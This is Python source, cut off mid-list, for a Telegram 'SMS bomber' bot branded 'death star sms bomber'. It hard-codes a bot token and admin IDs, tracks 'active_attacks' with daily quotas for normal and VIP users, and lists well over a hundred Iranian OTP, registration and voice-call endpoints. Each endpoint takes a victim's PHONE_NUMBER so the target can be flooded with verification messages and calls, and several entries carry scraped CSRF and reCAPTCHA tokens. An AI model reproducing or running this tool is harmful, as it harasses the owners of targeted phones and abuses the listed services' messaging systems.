# -*- coding: utf-8 -*-
import telebot
from telebot import types
import requests
import threading
import time
from datetime import datetime
import re
import os
import sqlite3
import hashlib
import random
import json

# ========== تنظیمات اصلی ==========
TOKEN = "8485669315:AAEbEt7ZLNE-Jv6iPDNi76ubZgFe7zEZ5X0"
ADMIN_IDS = [8226091292, 7620484201]  # ادمین‌های ثابت

# ========== تعریف بات ==========
bot = telebot.TeleBot(TOKEN)

# ========== کانال ربات ==========
CREATOR_USERNAME = "@death_star_sms_bomber"
BOT_NAME = "𝗱𝗲𝗮𝘁𝗵 𝘀𝘁𝗮𝗿 𝘀𝗺𝘀 𝗯𝗼𝗺𝗯𝗲𝗿"

# ========== شماره‌های مسدود شده ==========
BLOCKED_PHONE_HASHES = [
    "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918",
    "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
]

# ========== متغیرها ==========
user_states = {}
active_attacks = {}
DAILY_LIMIT_NORMAL = 5
DAILY_LIMIT_VIP = 20
bot_active = True

# ========== لیست کامل APIها ==========
APIS = [
    # ========== APIهای اصلی ==========
    {
        "name": "اسنپ",
        "url": "https://nobat.ir/api/public/patient/login/phone",
        "data": {"mobile": "PHONE_NUMBER"},
        "headers": {"content-type": "multipart/form-data"}
    },
    {
        "name": "آلوپیک",
        "url": "https://api.alopeyk.com/api/v2/register-customer?platform=pwa",
        "data": {
            "type": "CUSTOMER",
            "model": "Chrome 111.0.0.0",
            "platform": "pwa",
            "version": "10",
            "manufacturer": "Windows",
            "isVirtual": False,
            "serial": True,
            "app_version": "1.2.9",
            "uuid": True,
            "firstname": "تست",
            "lastname": "تست",
            "phone": "PHONE_NUMBER",
            "email": "",
            "referred_by": "",
            "lat": None,
            "lng": None
        }
    },
    {
        "name": "دیوار",
        "url": "https://api.divar.ir/v5/auth/authenticate",
        "data": {"phone": "PHONE_NUMBER"}
    },
    {
        "name": "شیپور",
        "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
        "data": {"username": "PHONE_NUMBER"}
    },
    {
        "name": "دیجی‌کالا",
        "url": "https://api.digikala.com/v1/user/authenticate/",
        "data": {
            "backUrl": "/",
            "username": "PHONE_NUMBER",
            "otp_call": False,
            "hash": None
        }
    },
    {
        "name": "اسنپ اکسپرس",
        "url": "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass",
        "data": {
            "cellphone": "PHONE_NUMBER",
            "captcha": "",
            "optionalLoginToken": True,
            "local": ""
        }
    },
    {
        "name": "ازکی",
        "url": "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/",
        "data": {"phoneNumber": "PHONE_NUMBER"},
        "headers": {"deviceid": "6"}
    },
    {
        "name": "اسنپ رانندگان",
        "url": "https://digitalsignup.snapp.ir/ds3/api/v3/otp",
        "data": {"cellphone": "PHONE_NUMBER"}
    },
    {
        "name": "استادکار",
        "url": "https://api.ostadkr.com/login",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "میاره",
        "url": "https://www.miare.ir/api/otp/driver/request/",
        "data": {"phone_number": "PHONE_NUMBER"}
    },
    {
        "name": "تپسی رانندگان",
        "url": "https://api.tapsi.ir/api/v2.2/user",
        "data": {
            "credential": {
                "phoneNumber": "PHONE_NUMBER",
                "role": "DRIVER"
            },
            "otpOption": "SMS"
        }
    },
    {
        "name": "تپسی مسافران",
        "url": "https://api.tapsi.ir/api/v2.2/user",
        "data": {
            "credential": {
                "phoneNumber": "PHONE_NUMBER",
                "role": "PASSENGER"
            },
            "otpOption": "SMS"
        }
    },
    {
        "name": "بانی‌مد",
        "url": "https://mobapi.banimode.com/api/v2/auth/request",
        "data": {"phone": "PHONE_NUMBER"}
    },
    {
        "name": "دکتر دکتر",
        "url": "https://drdr.ir/api/v3/auth/login/mobile/init",
        "data": {"mobile": "PHONE_NUMBER"},
        "headers": {"client-id": "f60d5037-b7ac-404a-9e3a-a263fd9f8054"}
    },
    {
        "name": "طاقچه",
        "url": "https://gw.taaghche.com/v4/site/auth/login",
        "data": {"contact": "PHONE_NUMBER", "forceOtp": False}
    },
    {
        "name": "کمدا",
        "url": "https://api.komodaa.com/api/v2.6/loginRC/request",
        "data": {"phone_number": "PHONE_NUMBER"}
    },
    {
        "name": "وندار",
        "url": "https://api.vandar.io/account/v1/check/mobile",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "جاباما",
        "url": "https://taraazws.jabama.com/api/v4/account/send-code",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "پینورست",
        "url": "https://api.pinorest.com/frontend/auth/login/mobile",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "تترلند",
        "url": "https://service.tetherland.com/api/v5/login-register",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "علی‌بابا",
        "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
        "data": {"phoneNumber": "PHONE_NUMBER"}
    },
    {
        "name": "دکتر نکست",
        "url": "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
        "data": {"source": "besina", "mobile": "PHONE_NUMBER"}
    },
    {
        "name": "کلاسینو",
        "url": "https://student.classino.com/otp/v1/api/login",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "بی‌میشو",
        "url": "https://api.bimesho.com/api/v1/auth/otp/send",
        "data": {"username": "PHONE_NUMBER"}
    },
    {
        "name": "آزکیوام",
        "url": "https://api.azkivam.com/auth/login",
        "data": {"mobileNumber": "PHONE_NUMBER"}
    },
    {
        "name": "تبدیل 24",
        "url": "https://tabdil24.net/api/api/v1/auth/login-register",
        "data": {"emailOrMobile": "PHONE_NUMBER"}
    },
    {
        "name": "ویترین",
        "url": "https://www.vitrin.shop/api/v1/user/request_code",
        "data": {"phone_number": "PHONE_NUMBER", "forgot_password": False}
    },
    {
        "name": "کارناوال",
        "url": "https://www.karnaval.ir/api-2/graphql",
        "data": {
            "queryId": "0edebe0df353cee7f11614a37087371f",
            "variables": {"phone": "PHONE_NUMBER", "isSecondAttempt": False}
        }
    },
    {
        "name": "تپسی شاپ",
        "url": "https://ids.tapsi.shop/authCustomer/CreateOtpForRegister",
        "data": {"user": "PHONE_NUMBER"}
    },
    {
        "name": "اسنپ تاکسی",
        "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        "data": {"cellphone": "+98PHONE_NUMBER_WITHOUT_0"}
    },
    {
        "name": "تروب",
        "url": "https://api.torob.com/a/phone/send-pin/",
        "method": "GET",
        "data": {"phone_number": "PHONE_NUMBER"}
    },
    {
        "name": "بالد",
        "url": "https://account.api.balad.ir/api/web/auth/login/",
        "data": {"phone_number": "PHONE_NUMBER", "os_type": "W"}
    },
    {
        "name": "بهترینو",
        "url": "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/",
        "data": {"phone": "PHONE_NUMBER"}
    },
    {
        "name": "بیت 24",
        "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
        "data": {"mobile": "PHONE_NUMBER", "contry_code": "98"}
    },
    {
        "name": "اوکالا",
        "url": "https://api-react.okala.com/C/CustomerAccount/OTPRegister",
        "data": {"mobile": "PHONE_NUMBER", "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False}
    },
    {
        "name": "آی‌تول",
        "url": "https://app.itoll.com/api/v1/auth/login",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "گپ",
        "url": "https://core.gap.im/v1/user/add.json",
        "method": "GET",
        "data": {"mobile": "+98PHONE_NUMBER_WITHOUT_0"}
    },
    {
        "name": "پینکت",
        "url": "https://pinket.com/api/cu/v2/phone-verification",
        "data": {"phoneNumber": "PHONE_NUMBER"}
    },
    {
        "name": "فوتبال 360",
        "url": "https://football360.ir/api/auth/verify-phone/",
        "data": {"phone_number": "+98PHONE_NUMBER_WITHOUT_0"}
    },
    {
        "name": "آقای بلیط",
        "url": "https://auth.mrbilit.com/api/login/exists/v2",
        "method": "GET",
        "data": {"mobileOrEmail": "PHONE_NUMBER", "source": 2, "sendTokenIfNot": "true"}
    },
    {
        "name": "همراه مکانیک",
        "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
        "data": {"PhoneNumber": "PHONE_NUMBER", "prevDomainUrl": "https://www.google.com/"}
    },
    {
        "name": "لندو",
        "url": "https://api.lendo.ir/api/customer/auth/send-otp",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "فیدیبو",
        "url": "https://fidibo.com/user/login-by-sms",
        "data": {"mobile_number": "PHONE_NUMBER_WITHOUT_0", "country_code": "ir"}
    },
    {
        "name": "خودرو 45",
        "url": "https://khodro45.com/api/v1/customers/otp/",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "پته",
        "url": "https://api.pateh.com/ath/auth/login-or-register",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "کتابچی",
        "url": "https://ketabchi.com/api/v1/auth/requestVerificationCode",
        "data": {"auth": {"phoneNumber": "PHONE_NUMBER"}}
    },
    {
        "name": "بیمیتو",
        "url": "https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code",
        "data": {"phoneNumber": "PHONE_NUMBER", "isResend": False}
    },
    {
        "name": "پیندو",
        "url": "https://api.pindo.ir/v1/user/login-register/",
        "data": {"phone": "PHONE_NUMBER"}
    },
    {
        "name": "دلینو",
        "url": "https://www.delino.com/user/register",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "زودی‌اکس",
        "url": "https://admin.zoodex.ir/api/v1/login/check",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "کوکالا",
        "url": "https://api.kukala.ir/api/user/Otp",
        "data": {"phoneNumber": "PHONE_NUMBER"}
    },
    {
        "name": "بوسکول",
        "url": "https://www.buskool.com/send_verification_code",
        "data": {"phone": "PHONE_NUMBER"}
    },
    {
        "name": "فلایت‌آی‌او",
        "url": "https://flightio.com/bff/Authentication/CheckUserKey",
        "data": {"userKey": "98-PHONE_NUMBER_WITHOUT_0", "userKeyType": 1}
    },
    {
        "name": "آبان‌تتر",
        "url": "https://abantether.com/users/register/phone/send/",
        "data": {"phoneNumber": "PHONE_NUMBER"}
    },
    {
        "name": "پولینو",
        "url": "https://api.pooleno.ir/v1/auth/check-mobile",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "اسنپ‌فود",
        "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass",
        "params": {"lat": "35.774", "long": "51.418", "client": "WEBSITE"},
        "data": {"cellphone": "PHONE_NUMBER"}
    },
    {
        "name": "بیت‌بارگ",
        "url": "https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
        "data": {"phone": "PHONE_NUMBER"}
    },
    {
        "name": "کیلید",
        "url": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start",
        "params": {"realm": "PORTAL"},
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "اتاقک",
        "url": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
        "data": {"userName": "PHONE_NUMBER"}
    },
    {
        "name": "شب",
        "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp",
        "data": {"mobile": "PHONE_NUMBER", "country_code": "+98"}
    },
    {
        "name": "ری‌بیت",
        "url": "https://api.raybit.net:3111/api/v1/authentication/register/mobile",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "نماوا",
        "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
        "data": {"UserName": "PHONE_NUMBER"}
    },
    {
        "name": "آنارگیفت",
        "url": "https://api.anargift.com/api/people/auth",
        "data": {"user": "PHONE_NUMBER"}
    },
    {
        "name": "ریحا",
        "url": "https://www.riiha.ir/api/v1.0/authenticate",
        "data": {"mobile": "PHONE_NUMBER", "mobile_code": "", "type": "mobile"}
    },
    {
        "name": "آقای بلیط تماس",
        "url": "https://auth.mrbilit.com/api/Token/send/byCall",
        "method": "GET",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "گپ تماس",
        "url": "https://core.gap.im/v1/user/resendCode.json",
        "method": "GET",
        "data": {"mobile": "+98PHONE_NUMBER_WITHOUT_0", "type": "IVR"}
    },
    {
        "name": "ازکی تماس",
        "url": "https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code",
        "method": "GET",
        "data": {"phoneNumber": "PHONE_NUMBER"}
    },
    {
        "name": "تریپ",
        "url": "https://gateway.trip.ir/api/registers",
        "data": {"CellPhone": "PHONE_NUMBER"}
    },
    {
        "name": "رقام",
        "url": "https://web.raghamapp.com/api/users/code",
        "data": {"phone": "+98PHONE_NUMBER_WITHOUT_0"}
    },
    {
        "name": "اسنپ مارکت",
        "url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass",
        "method": "POST",
        "data": {"cellphone": "PHONE_NUMBER_WITHOUT_0"}
    },
    {
        "name": "بیت‌پین",
        "url": "https://api.bitpin.ir/v3/usr/authenticate/",
        "data": {"device_type": "web", "password": "PassRANDOM", "phone": "PHONE_NUMBER"}
    },
    {
        "name": "اسنپ دکتر",
        "url": "https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/PHONE_NUMBER/sms",
        "method": "GET",
        "data": {"cCode": "%2B98"}
    },
    {
        "name": "قبضینو",
        "url": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
        "data": {"Parameters": {"ApplicationType": "Web", "ApplicationVersion": "1.0.0", "MobileNumber": "PHONE_NUMBER"}}
    },
    {
        "name": "ایمتیاز",
        "url": "https://web.emtiyaz.app/json/login",
        "data": {"send": "1", "cellphone": "PHONE_NUMBER"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    # ========== APIهای اضافی ==========
    {
        "name": "Arzinja Login",
        "url": "https://arzinja.app/api/login",
        "data": {},
        "headers": {"content-type": "multipart/form-data"}
    },
    {
        "name": "Messenger IranLMS",
        "url": "https://messengerg2c4.iranlms.ir/",
        "data": {
            "api_version": "3",
            "method": "sendCode",
            "data": {"phone_number": "PHONE_NUMBER_WITHOUT_0", "send_type": "SMS"}
        }
    },
    {
        "name": "Digify Shop GraphQL",
        "url": "https://apollo.digify.shop/graphql",
        "data": {
            "operationName": "Mutation",
            "variables": {"content": {"phone_number": "PHONE_NUMBER"}},
            "query": "mutation Mutation($content: MerchantRegisterOTPSendContent) { merchantRegister { otpSend(content: $content) __typename } }"
        }
    },
    {
        "name": "Chartex Validate",
        "url": "https://api.chartex.net/api/v2/user/validate",
        "data": {"mobile": "PHONE_NUMBER", "country_code": "IR", "provider_code": "RUBIKA"}
    },
    {
        "name": "Snapptrip Register",
        "url": "https://www.snapptrip.com/register",
        "data": {
            "lang": "fa", "country_id": "860", "password": "snaptrippass",
            "mobile_phone": "PHONE_NUMBER", "country_code": "+98", "email": "example@gmail.com"
        }
    },
    {
        "name": "OKCS Login",
        "url": "https://okcs.com/users/mobilelogin",
        "method": "GET",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "Wisgoon Gateway",
        "url": "https://gateway.wisgoon.com/api/v1/auth/login/",
        "data": {
            "phone": "PHONE_NUMBER",
            "recaptcha-response": "03AGdBq25IQtuwqOIeqhl7Tx1EfCGRcNLW8DHYgdHSSyYb0NUwSj5bwnnew9PCegVj2EurNyfAHYRbXqbd4lZo0VJTaZB3ixnGq5aS0BB0YngsP0LXpW5TzhjAvOW6Jo72Is0K10Al_Jaz7Gbyk2adJEvWYUNySxKYvIuAJluTz4TeUKFvgxKH9btomBY9ezk6mxnhBRQeMZYasitt3UCn1U1Xhy4DPZ0gj8kvY5B0MblNpyyjKGUuk_WRiS_6DQsVd5fKaLMy76U5wBQsZDUeOVDD9CauPUR4W_cNJEQP1aPloEHwiLJtFZTf-PVjQU-H4fZWPvZbjA2txXlo5WmYL4GzTYRyI4dkitn3JmWiLwSdnJQsVP0nP3wKN0LV3D7DjC5kDwM0EthEz6iqYzEEVD-s2eeWKiqBRfTqagbMZQfW50Gdb6bsvDmD2zKV8nf6INvfPxnMZC95rOJdHOY-30XGS2saIzjyvg",
            "token": "e622c330c77a17c8426e638d7a85da6c2ec9f455"
        }
    },
    {
        "name": "Tagmond Phone",
        "url": "https://tagmond.com/phone_number",
        "data": {"utf8": "✓", "phone_number": "PHONE_NUMBER", "g-recaptcha-response": ""}
    },
    {
        "name": "Doctoreto Register",
        "url": "https://api.doctoreto.com/api/web/patient/v1/accounts/register",
        "data": {"mobile": "PHONE_NUMBER", "country_id": 205}
    },
    {
        "name": "Olgoo Books",
        "url": "https://www.olgoobooks.ir/sn/userRegistration/",
        "data": {
            "contactInfo[mobile]": "PHONE_NUMBER",
            "contactInfo[agreementAccepted]": "1",
            "contactInfo[teachingFieldId]": "1",
            "contactInfo[eduGradeIds][7]": "7",
            "submit_register": "1"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Pakhsh Shop Digits",
        "url": "https://www.pakhsh.shop/wp-admin/admin-ajax.php",
        "data": {
            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
            "csrf": "fdaa7fc8e6", "login": "2", "json": "1"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Didnegar Digits",
        "url": "https://www.didnegar.com/wp-admin/admin-ajax.php",
        "data": {
            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER_WITHOUT_0",
            "csrf": "4c9ac22ff4", "login": "1", "mobmail": "PHONE_NUMBER", "json": "1"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "See5 CRM OTP",
        "url": "https://crm.see5.net/api_ajax/sendotp.php",
        "data": {"mobile": "PHONE_NUMBER", "action": "sendsms"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "DrSaina Register",
        "url": "https://www.drsaina.com/RegisterLogin",
        "data": {
            "PhoneNumber": "PHONE_NUMBER", "noLayout": "False", "action": "checkIfUserExistOrNot"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Devslop OTP",
        "url": "https://i.devslop.app/app/ifollow/api/otp.php",
        "data": {"number": "PHONE_NUMBER", "state": "number"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Behzad Shami Digits",
        "url": "https://behzadshami.com/wp-admin/admin-ajax.php",
        "data": {
            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER_WITHOUT_0",
            "csrf": "3b4194a8bb", "login": "2", "digits_reg_name": "Nvgu", "digits_reg_mail": "PHONE_NUMBER_WITHOUT_0"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Ghasedak24 Register",
        "url": "https://ghasedak24.com/user/ajax_register",
        "data": {"username": "PHONE_NUMBER"}
    },
    {
        "name": "Iran Ketab Register",
        "url": "https://www.iranketab.ir/account/register",
        "data": {"UserName": "PHONE_NUMBER"}
    },
    {
        "name": "Irani Card Register",
        "url": "https://api.iranicard.ir/api/v1/register",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "PUBG Sell Login",
        "url": "https://pubg-sell.ir/loginuser",
        "method": "POST",
        "data": {"username": "PHONE_NUMBER"}
    },
    {
        "name": "TJ8 Register",
        "url": "https://tj8.ir/auth/register",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "Mashinbank Check",
        "url": "https://mashinbank.com/api2/users/check",
        "data": {"mobileNumber": "PHONE_NUMBER"}
    },
    {
        "name": "Cinematicket Signup",
        "url": "https://cinematicket.org/api/v1/users/signup",
        "data": {"phone_number": "PHONE_NUMBER"}
    },
    {
        "name": "Kafe Gheymat Login",
        "url": "https://kafegheymat.com/shop/getLoginSms",
        "data": {"phone": "PHONE_NUMBER"}
    },
    {
        "name": "Opco Register",
        "url": "https://shop.opco.co.ir/index.php",
        "data": {"telephone": "PHONE_NUMBER"},
        "params": {"route": "extension/module/login_verify/update_register_code"}
    },
    {
        "name": "Melix Shop OTP",
        "url": "https://melix.shop/site/api/v1/user/otp",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "Safiran Shop Login",
        "url": "https://safiran.shop/login",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "Pirankala Send Phone",
        "url": "https://pirankalaco.ir/shop/SendPhone.php",
        "data": {"phone": "PHONE_NUMBER"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "TNovin Login",
        "url": "http://shop.tnovin.com/login",
        "data": {"phone": "PHONE_NUMBER"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Dastkhat Store",
        "url": "https://dastkhat-isad.ir/api/v1/user/store",
        "data": {"mobile": "PHONE_NUMBER_WITHOUT_0", "countryCode": 98, "device_os": 2}
    },
    {
        "name": "Hamlex Register",
        "url": "https://hamlex.ir/register.php",
        "data": {"fullname": "ممد", "phoneNumber": "PHONE_NUMBER", "register": ""},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "IRWCO Register",
        "url": "https://irwco.ir/register",
        "data": {"mobile": "PHONE_NUMBER"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Moshaveran724 PMS",
        "url": "https://moshaveran724.ir/m/pms.php",
        "data": {"againkey": "PHONE_NUMBER", "cache": "false"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Sibbank Auth",
        "url": "https://api.sibbank.ir/v1/auth/login",
        "data": {"phone_number": "PHONE_NUMBER"}
    },
    {
        "name": "Steel Alborz Digits",
        "url": "https://steelalborz.com/wp-admin/admin-ajax.php",
        "data": {
            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
            "csrf": "2aae5b41f1", "login": "2", "digits_reg_mail": "PHONE_NUMBER"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Arshiyan Send Code",
        "url": "https://api.arshiyan.com/send_code",
        "data": {"country_code": "98", "phone_number": "PHONE_NUMBER_WITHOUT_0"}
    },
    {
        "name": "Topnoor OTP",
        "url": "https://backend.topnoor.ir/web/v1/user/otp",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "Alinance Register",
        "url": "https://api.alinance.com/user/register/mobile/send/",
        "data": {"phone_number": "PHONE_NUMBER"}
    },
    {
        "name": "Alopeyk Safir",
        "url": "https://api.alopeyk.com/safir-service/api/v1/login",
        "data": {"phone": "PHONE_NUMBER"}
    },
    {
        "name": "Chaymarket Digits",
        "url": "https://www.chaymarket.com/wp-admin/admin-ajax.php",
        "data": {
            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
            "csrf": "c832b38a97", "login": "2", "json": "1"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Coffe Fastfood Digits",
        "url": "https://coffefastfoodluxury.ir/wp-admin/admin-ajax.php",
        "data": {
            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
            "csrf": "e23c15918c", "login": "2", "digits_reg_mail": "PHONE_NUMBER"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Dosma Verify",
        "url": "https://app.dosma.ir/sendverify/",
        "data": {"username": "PHONE_NUMBER"}
    },
    {
        "name": "Ehteraman OTP",
        "url": "https://api.ehteraman.com/api/request/otp",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "MCI EB OTP",
        "url": "https://api-ebcom.mci.ir/services/auth/v1.0/otp",
        "data": {"msisdn": "PHONE_NUMBER_WITHOUT_0"}
    },
    {
        "name": "HBBS Send Code",
        "url": "https://api.hbbs.ir/authentication/SendCode",
        "data": {"MobileNumber": "PHONE_NUMBER"}
    },
    {
        "name": "Homtick Verify",
        "url": "https://auth.homtick.com/api/V1/User/GetVerifyCode",
        "data": {
            "mobileOrEmail": "PHONE_NUMBER",
            "deviceCode": "d520c7a8-421b-4563-b955-f5abc56b97ec"
        }
    },
    {
        "name": "Iran Amlaak OTP",
        "url": "https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms",
        "data": {"AgencyMobile": "PHONE_NUMBER"}
    },
    {
        "name": "KCD Auth",
        "url": "https://api.kcd.app/api/v1/auth/login",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "Mazoocandle Login",
        "url": "https://mazoocandle.ir/login",
        "data": {"phone": "PHONE_NUMBER_WITHOUT_0"}
    },
    {
        "name": "Paymishe OTP",
        "url": "https://api.paymishe.com/api/v1/otp/registerOrLogin",
        "data": {"mobile": "PHONE_NUMBER"}
    },
    {
        "name": "Rayshomar Register",
        "url": "https://api.rayshomar.ir/api/Register/RegistrMobile",
        "data": {"MobileNumber": "PHONE_NUMBER"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Amoomilad Sendcode",
        "url": "https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode",
        "data": {
            "Token": "5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c",
            "DeviceId": 1, "PhoneNumber": "PHONE_NUMBER", "Helper": 77942
        }
    },
    {
        "name": "Ashraafi Digits",
        "url": "https://ashraafi.com/wp-admin/admin-ajax.php",
        "data": {
            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER_WITHOUT_0",
            "csrf": "54dfdabe34", "login": "1", "mobmail": "PHONE_NUMBER_WITHOUT_0"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Bandar Azad Digits",
        "url": "https://bandarazad.com/wp-admin/admin-ajax.php",
        "data": {
            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
            "csrf": "ec10ccb02a", "login": "2", "digits_reg_mail": "PHONE_NUMBER"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Bazidone Digits",
        "url": "https://bazidone.com/wp-admin/admin-ajax.php",
        "data": {
            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER_WITHOUT_0",
            "csrf": "c0f5d0dcf2", "login": "1", "mobmail": "PHONE_NUMBER"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Bigtoys Digits",
        "url": "https://www.bigtoys.ir/wp-admin/admin-ajax.php",
        "data": {
            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
            "csrf": "94cf3ad9a4", "login": "2", "digits_reg_name": "بیبلیبل", "digits_reg_mail": "PHONE_NUMBER"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Bitex24 Send SMS",
        "url": "https://bitex24.com/api/v1/auth/sendSms",
        "method": "GET",
        "data": {"mobile": "PHONE_NUMBER", "dial_code": "0"}
    },
    {
        "name": "Candoo SMS",
        "url": "https://www.candoosms.com/wp-admin/admin-ajax.php",
        "data": {"action": "send_sms", "phone": "PHONE_NUMBER"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Fars Graphic Digits",
        "url": "https://farsgraphic.com/wp-admin/admin-ajax.php",
        "data": {
            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER_WITHOUT_0",
            "csrf": "79a35b4aa3", "login": "2", "digits_reg_name": "نیمنمنیس", "digits_reg_mail": "PHONE_NUMBER_WITHOUT_0"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Glite Login",
        "url": "https://www.glite.ir/wp-admin/admin-ajax.php",
        "data": {"action": "logini_first", "login": "PHONE_NUMBER"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Hemat Elec Digits",
        "url": "https://shop.hemat-elec.ir/wp-admin/admin-ajax.php",
        "data": {
            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
            "csrf": "d33076d828", "login": "2", "digits_reg_mail": "PHONE_NUMBER"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Kodakamoz Digits",
        "url": "https://www.kodakamoz.com/wp-admin/admin-ajax.php",
        "data": {
            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
            "csrf": "18551366bc", "login": "2", "digits_reg_mail": "PHONE_NUMBER"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Mipersia Digits",
        "url": "https://www.mipersia.com/wp-admin/admin-ajax.php",
        "data": {
            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
            "csrf": "2d39af0a72", "login": "2", "digits_reg_mail": "PHONE_NUMBER"
        },
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Novinbook Phone",
        "url": "https://novinbook.com/index.php",
        "data": {"phone": "PHONE_NUMBER"},
        "params": {"route": "account/phone"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Offch OTP",
        "url": "https://api.offch.com/auth/otp",
        "data": {"username": "PHONE_NUMBER"}
    },
    {
        "name": "Sabziman Phone Exist",
        "url": "https://sabziman.com/wp-admin/admin-ajax.php",
        "data": {"action": "newphoneexist", "phonenumber": "PHONE_NUMBER"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Taj Tehran Register",
